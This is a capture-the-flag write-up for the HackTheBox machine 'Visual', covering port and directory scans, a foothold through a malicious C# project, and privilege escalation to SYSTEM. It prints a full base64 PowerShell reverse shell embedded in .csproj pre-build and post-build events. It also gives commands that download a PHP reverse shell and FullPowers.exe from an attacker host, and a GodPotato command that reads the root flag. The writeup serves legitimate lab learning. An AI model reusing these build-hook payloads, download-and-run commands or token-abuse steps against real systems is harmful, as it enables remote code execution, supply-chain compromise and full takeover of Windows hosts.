# Visual HTB Writeup

[![Visual.png](https://i.postimg.cc/2yqMQBrb/Visual.png)](https://postimg.cc/MfS9xHcq)

Small brief writeup for the machine Visual in HackTheBox (Medium Difficulty) with the needed C# project to gain foothold and reverse shell along with used payloads to gain access to root.txt

NOTE: if you want to know more details about methods and payloads used in my writeup please, see the last section in this writeup for more information (Resources and Links) 
															
							
----------------------------------------------------------------------------------------------------------------------------------------------------

 # Enumeration and Target Info
 	
----------------------------------------------------------------------------------------------------------------------------------------------------	

	- ip 10.10.11.234
	- Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
	- Application provides environment to automaticly compiles code for the user by providing a link to the repo
	
	
----------------------------------------------------------------------------------------------------------------------------------------------------

 # nmap scan
 	
----------------------------------------------------------------------------------------------------------------------------------------------------	
	
	┌──(root㉿kali)-[~/htb/machines/visual]
	└─# nmap -sC -A -O -sV -Pn -p- 10.10.11.234 -oN scan-map
	Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-04 13:55 +03
	Nmap scan report for 10.10.11.234
	Host is up (0.21s latency).
	Not shown: 65534 filtered tcp ports (no-response)
	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
	|_http-title: Visual - Revolutionizing Visual Studio Builds
	|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running (JUST GUESSING): Microsoft Windows 2019 (89%)
	Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
	No exact OS matches for host (test conditions non-ideal).
	Network Distance: 2 hops
	
	TRACEROUTE (using port 80/tcp)
	HOP RTT       ADDRESS
	1   207.81 ms 10.10.14.1
	2   207.96 ms 10.10.11.234
	
	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 267.82 seconds
 

	
----------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Dirsearch / Gobuster
 	
----------------------------------------------------------------------------------------------------------------------------------------------------	
	
	┌──(root㉿kali)-[~/htb/machines/visual]
	└─# dirsearch -u 10.10.11.234
	
	  _|. _ _  _  _  _ _|_    v0.4.2
	 (_||| _) (/_(_|| (_| )
	
	Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
	
	Output File: /root/.dirsearch/reports/10.10.11.234_23-10-04_13-57-01.txt
	
	Error Log: /root/.dirsearch/logs/errors-23-10-04_13-57-01.log
	
	Target: http://10.10.11.234/
	
	[13:57:02] Starting: 
	[13:57:04] 403 -  302B  - /%C0%AE%C0%AE%C0%AF                              
	[13:57:04] 403 -  302B  - /%3f/                                            
	[13:57:04] 301 -  334B  - /js  ->  http://10.10.11.234/js/                 
	[13:57:04] 403 -  302B  - /%ff                                             
	[13:57:08] 403 -  302B  - /.ht_wsr.txt                                     
	[13:57:08] 403 -  302B  - /.htaccess.bak1
	[13:57:08] 403 -  302B  - /.htaccess.orig
	[13:57:08] 403 -  302B  - /.htaccess.sample
	[13:57:08] 403 -  302B  - /.htaccess.save
	[13:57:08] 403 -  302B  - /.htaccess_extra
	[13:57:08] 403 -  302B  - /.htaccess_orig
	[13:57:08] 403 -  302B  - /.htaccess_sc
	[13:57:08] 403 -  302B  - /.htaccessBAK
	[13:57:08] 403 -  302B  - /.htaccessOLD
	[13:57:08] 403 -  302B  - /.htaccessOLD2
	[13:57:08] 403 -  302B  - /.htm                                            
	[13:57:08] 403 -  302B  - /.html
	[13:57:08] 403 -  302B  - /.htpasswd_test
	[13:57:08] 403 -  302B  - /.htpasswds
	[13:57:08] 403 -  302B  - /.httr-oauth
	[13:57:21] 403 -  302B  - /Trace.axd::$DATA                                 
	[13:57:39] 301 -  338B  - /assets  ->  http://10.10.11.234/assets/          
	[13:57:39] 200 -  987B  - /assets/
	[13:57:43] 403 -  302B  - /cgi-bin/                                         
	[13:57:43] 200 -   2KB  - /cgi-bin/printenv.pl                              
	[13:57:46] 301 -  335B  - /css  ->  http://10.10.11.234/css/                
	[13:57:52] 503 -  402B  - /examples/                                        
	[13:57:52] 503 -  402B  - /examples
	[13:57:53] 503 -  402B  - /examples/servlets/index.html                     
	[13:57:53] 503 -  402B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
	[13:57:53] 503 -  402B  - /examples/servlet/SnoopServlet                    
	[13:57:53] 503 -  402B  - /examples/jsp/snp/snoop.jsp
	[13:57:53] 503 -  402B  - /examples/servlets/servlet/RequestHeaderExample   
	[13:57:53] 503 -  402B  - /examples/servlets/servlet/CookieExample          
	[13:57:58] 200 -   7KB  - /index.php                                        
	[13:57:58] 403 -  302B  - /index.php::$DATA                                 
	[13:57:58] 200 -   7KB  - /index.pHp
	[13:57:58] 200 -   7KB  - /index.php.
	[13:57:59] 200 -   7KB  - /index.php/login/                                 
	[13:58:01] 200 -   2KB  - /js/                                              
	[13:58:12] 403 -  421B  - /phpmyadmin/ChangeLog                             
	[13:58:12] 403 -  421B  - /phpmyadmin/docs/html/index.html                  
	[13:58:12] 403 -  421B  - /phpmyadmin/README
	[13:58:12] 403 -  421B  - /phpmyadmin/doc/html/index.html
	[13:58:13] 403 -  421B  - /phpmyadmin                                       
	[13:58:14] 403 -  421B  - /phpmyadmin/                                      
	[13:58:14] 403 -  421B  - /phpmyadmin/index.php
	[13:58:14] 403 -  421B  - /phpmyadmin/phpmyadmin/index.php                  
	[13:58:14] 403 -  421B  - /phpmyadmin/scripts/setup.php                     
	[13:58:20] 403 -  421B  - /server-status                                    
	[13:58:21] 403 -  421B  - /server-status/
	[13:58:21] 403 -  421B  - /server-info                                      
	[13:58:32] 301 -  339B  - /uploads  ->  http://10.10.11.234/uploads/        
	[13:58:32] 403 -  302B  - /uploads/
	[13:58:35] 403 -  302B  - /web.config::$DATA                                
	[13:58:35] 403 -  421B  - /webalizer                                        
	                                                                             
	Task Completed
	



	┌──(root㉿kali)-[~/htb/machines/visual]
	└─# gobuster dir -u 10.10.11.234 -w /usr/share/wordlists/dirb/common.txt
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://10.10.11.234
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/.htaccess            (Status: 403) [Size: 302]
	/.hta                 (Status: 403) [Size: 302]
	/.htpasswd            (Status: 403) [Size: 302]
	/assets               (Status: 301) [Size: 338] [--> http://10.10.11.234/assets/]
	/aux                  (Status: 403) [Size: 302]
	/cgi-bin/             (Status: 403) [Size: 302]
	/com1                 (Status: 403) [Size: 302]
	/com3                 (Status: 403) [Size: 302]
	/com2                 (Status: 403) [Size: 302]
	/con                  (Status: 403) [Size: 302]
	/css                  (Status: 301) [Size: 335] [--> http://10.10.11.234/css/]
	/examples             (Status: 503) [Size: 402]
	/index.php            (Status: 200) [Size: 7534]
	/js                   (Status: 301) [Size: 334] [--> http://10.10.11.234/js/]
	/licenses             (Status: 403) [Size: 421]
	/lpt2                 (Status: 403) [Size: 302]
	/lpt1                 (Status: 403) [Size: 302]
	/nul                  (Status: 403) [Size: 302]
	/phpmyadmin           (Status: 403) [Size: 421]
	/prn                  (Status: 403) [Size: 302]
	/server-info          (Status: 403) [Size: 421]
	/server-status        (Status: 403) [Size: 421]
	/uploads              (Status: 301) [Size: 339] [--> http://10.10.11.234/uploads/]
	/webalizer            (Status: 403) [Size: 421]
	Progress: 4614 / 4615 (99.98%)
	===============================================================
	Finished
	===============================================================


----------------------------------------------------------------------------------------------------------------------------------------------------
      
 # Foothold and General Approach
	
----------------------------------------------------------------------------------------------------------------------------------------------------	 
    
- We need to host and write some sort of a c# code that support .NET 6.0 using VS Code that we would later on host locally and then we need to
	 find a way to execute this code on the internal network of the machine when it gets compiled and maybe establish a reverse shell.

- Below we will take a look at the steps of how we will host our repo locally and how can we import the repo on the target.
	 
	 
	 	- Hosting the repo locally on kali
	 		
		  (kali) git --bare clone PATH/TO/REPO repo-http
		  (kali) cd repo-http/.git
		  (kali) git --bare update-server-info
		  (kali) mv hooks/post-update.sample hooks/post-update
		  (kali) cd ..
		  (kali) python3 -m http.server 80 
		   

		
- We will create a simple C# project supporting .NET6 framework later on with the reverse shell imbedded in the pre-build and post-build events
      to be executed on the target during these events (see "User Access" section for details). After that we will proceed to import the final build on the
      targer using the url below after hosting it locatlly following the method above 
		
		
		  (URL) http://YOUR-IP:80/.git        <--------- This is the URL that we will use on the target to import our project from our locally hosted repo
		
		
		
	* (Note) The complete C# project used to gain reverse shell is available in this repo in folder named Visual. Just download that folder and edit the
    "prebuild.bat" and "postbuild.bat" to have your own generated powershell reverse shell command. Use "PowerShell #3 (Base64)" option when generating your
    reverse shell it worked reliably for me from https://www.revshells.com/
		
		
		
----------------------------------------------------------------------------------------------------------------------------------------------------

 # User Access
	
----------------------------------------------------------------------------------------------------------------------------------------------------	 
	
- Now since we have an idea how to host a repo locally and how to import it on the target. Next we need to created a C# project using VScode and we 
    were able to get an RCE using Pre-Build & Post-Build Events before and after comiling the project
	
- After creating a C# project that the victim's system supports, we will add pre and post build events to the .csproj file of the project
	
	  (File) Visual.csproj
	  
	  	  <Project Sdk="Microsoft.NET.Sdk">

		  <PropertyGroup>
		    <OutputType>Exe</OutputType>
		    <TargetFramework>net6.0</TargetFramework>
		    <ImplicitUsings>enable</ImplicitUsings>
		    <Nullable>enable</Nullable>
		  </PropertyGroup>
                  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
		   <Exec Command="call prebuild.bat" />
  		  </Target>
		
		  <Target Name="PostBuild" AfterTargets="PostBuildEvent">
		   <Exec Command="call postbuild.bat" />
		  </Target>
		  </Project>
 

- Next we create the prebuild.bat and postbuild.bat files with the reverse shell code like the one below (Powershell base64).
		
		(PS B64) powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


- After you modify the prebuild.bat and postbuild.bat in VSCode commit the changes using the below commands the need to be executed in terminal of the 	 
  Visual project from VSCode
 		
   	  (cmd) git add .
      	  (cmd) git commit -m "Modified pre and post build files"
	 


  
- We finaly host the project repo locally following the method mentioned in the foothold section and we upload the project to be compiled on the target 
  after starting an ncat listening on port you selected in the RS (port 9001 for me)


	   (PS) ┌──(root㉿kali)-[/root/htb/machines/visual/extracted]
		└─PS> nc -lvnp 9001
		listening on [any] 9001 ...
		connect to [10.10.14.197] from (UNKNOWN) [10.10.11.234] 49780
		whoami
		visual\enox
		PS C:\Windows\Temp\11cf635054c211b9d75e9659b010b5> cd C:\Users\enox\Desktop
		PS C:\Users\enox\Desktop> ls
		
		
		    Directory: C:\Users\enox\Desktop
		
		
		Mode                LastWriteTime         Length Name                                                                  
		----                -------------         ------ ----                                                                  
      ------->  -ar---       10/11/2023   5:16 AM             34 user.txt                                                              
		
		
		PS C:\Users\enox\Desktop> ls C:\Users
		
		
		    Directory: C:\Users
		
		
		Mode                LastWriteTime         Length Name                                                                  
		----                -------------         ------ ----                                                                  
		d-----        9/12/2023   2:02 AM                Administrator                                                         
		d-----        9/12/2023   2:27 AM                enox                                                                  
		d-r---        6/10/2023  10:08 AM                Public                                                                
		
		
		PS C:\Users\enox\Desktop> 
                                                             
		
----------------------------------------------------------------------------------------------------------------------------------------------------    
      
 # Privilege Escalation
   
----------------------------------------------------------------------------------------------------------------------------------------------------     
      
- We check all users available in the system following the ps commands below.

		(PS) PS C:\Users\enox\Desktop> Get-LocalUser | ft Name,Enabled,Description,LastLogon
		(PS) PS C:\Users\enox\Desktop> Get-ChildItem C:\Users -Force | select Name
		
		Name         
		----         
		Administrator
		All Users    
		Default      
		Default User 
		enox         
		Public       
		desktop.ini			
		
- After snooping around the user enox were able to locate the location and files of the target's PHP location and we add a Reverse Shell .PHP payload
    in the following path. (use a different port for the reverse shell other than the initial one that we used for the user "enox")
	
 		------>  (PATH) C:\xampp\htdocs\uploads>
	  
	  
- Next we upload the shell.php to the path stated above and we trigger the rev-shell after uploading it using the below commands.
	
 		(PS) IWR http://10.10.16.38:80/shell.php -outfile C:\xampp\htdocs\uploads\shell.php
	  
	 	PS C:\xampp\htdocs\uploads> IWR http://10.10.16.38:80/shell.php -outfile C:\xampp\htdocs\uploads\shell.php
		PS C:\xampp\htdocs\uploads> ls
		
		
		Directory: C:\xampp\htdocs\uploads
		
		
		Mode                LastWriteTime         Length Name                                                                  
		----                -------------         ------ ----                                                                  
		-a----        6/10/2023   4:20 PM             17 .htaccess                                                             
		-a----       10/15/2023   5:41 AM           5493 shell.php                                                             
		-a----       10/15/2023   5:24 AM              0 todo.txt

 
- Now we trigger the shell.php using the below command after we setup a listener in a PS (Powershell) terminal on kali
	
	  (PS) nc -lvnp 4444
	  
	  (Kali) curl http://10.10.11.234/uploads/shell.php  

		┌──(root㉿kali)-[/root/htb/machines/visual/extracted]
		└─PS> nc -lvnp 4444
		listening on [any] 4444 ...
		connect to [10.10.16.38] from (UNKNOWN) [10.10.11.234] 49947
		SOCKET: Shell has connected! PID: 3256
		Microsoft Windows [Version 10.0.17763.4851]
		(c) 2018 Microsoft Corporation. All rights reserved.
		C:\xampp\htdocs\uploads>whoami  
		nt authority\local service
	
	
	
----------------------------------------------------------------------------------------------------------------------------------------------------    
	
 # Root Access
      
----------------------------------------------------------------------------------------------------------------------------------------------------      

 
- Now that we got reverse shell on (nt authority\local service) account, we attempt to escalate our previleges using a tool called "FullPowers.exe"
		
	- We download and execute "FullPowers.exe" payload on the target and we were able esclate our privileges
      
 	      -------> (Before) C:\xampp\htdocs\uploads>whoami /priv
		
			PRIVILEGES INFORMATION
			----------------------
			
			Privilege Name                Description                    State   
			============================= ============================== ========
			SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
			SeCreateGlobalPrivilege       Create global objects          Enabled 
			SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
			
			C:\xampp\htdocs\uploads>whoami  
			nt authority\local service
			
          ------->   (PS) C:\xampp\htdocs\uploads>powershell Invoke-WebRequest -Uri http://10.10.16.38:80/FullPowers.exe -OutFile FullPowers.exe
			
			C:\xampp\htdocs\uploads>FullPowers.exe
			[+] Started dummy thread with id 256
			[+] Successfully created scheduled task.
			[+] Got new token! Privilege count: 7
			[+] CreateProcessAsUser() OK
			Microsoft Windows [Version 10.0.17763.4851]
			(c) 2018 Microsoft Corporation. All rights reserved.

	
          ------->   (PS) C:\Windows\system32>whoami /priv

			PRIVILEGES INFORMATION
			----------------------
			
			Privilege Name                Description                               State  
			============================= ========================================= =======
			SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
			SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
			SeAuditPrivilege              Generate security audits                  Enabled
			SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
			SeImpersonatePrivilege        Impersonate a client after authentication Enabled
			SeCreateGlobalPrivilege       Create global objects                     Enabled
			SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
      
      
      
	- Finaly we use the payload GodPotato to use our escalated privileges to read the root.txt file and GAMEOVER!
      
      
          ------->   (PS) C:\xampp\htdocs\uploads&gt;GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
      
			[*] CombaseModule: 0x140729114755072
			[*] DispatchTable: 0x140729117061232
			[*] UseProtseqFunction: 0x140729116437408
			[*] UseProtseqFunctionParamCount: 6
			[*] HookRPC
			[*] Start PipeServer
			[*] Trigger RPCSS
			[*] CreateNamedPipe \\.\pipe\eddc5caf-a9a5-4f43-a859-30b3ef72f888\pipe\epmapper
			[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
			[*] DCOM obj IPID: 0000bc02-114c-ffff-947a-3b2584370b9b
			[*] DCOM obj OXID: 0xbc504970a795308c
			[*] DCOM obj OID: 0xbb816e050dfc72e7
			[*] DCOM obj Flags: 0x281
			[*] DCOM obj PublicRefs: 0x0
			[*] Marshal Object bytes len: 100
			[*] UnMarshal Object
			[*] Pipe Connected!
			[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
			[*] CurrentsImpersonationLevel: Impersonation
			[*] Start Search System Token
			[*] PID : 884 Token:0x612  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
			[*] Find System Token : True
			[*] UnmarshalObject: 0x80070776
			[*] CurrentUser: NT AUTHORITY\SYSTEM
			[*] process start with pid 1316
          (Root.txt) ------->    b1737be04e3affa2e03b5b46c69f3cd7
      


----------------------------------------------------------------------------------------------------------------------------------------------------    
	
 # Resources and Links
      
----------------------------------------------------------------------------------------------------------------------------------------------------      

- Host repo from a local machine over HTTP
https://theartofmachinery.com/2016/07/02/git_over_http.html/

- Generate Reverse Shell
https://www.revshells.com/


- PHP Reverse Shell
https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php


- "FullPower.exe" Payload used to get the token for PE
https://github.com/itm4n/FullPowers/releases/tag/v0.1

   
- Payload that was used to pass commands with escalated privileges "GodPotato.exe"
https://github.com/BeichenDream/GodPotato

  
     
FROM THE RIVER TO THE SEE, PALESTINE WILL BE FREE!

[![palestine.jpg](https://i.postimg.cc/BnMv7d2T/palestine.jpg)](https://postimg.cc/gxLdntSj)
      
      
      
      
      
      
      
      
      
      




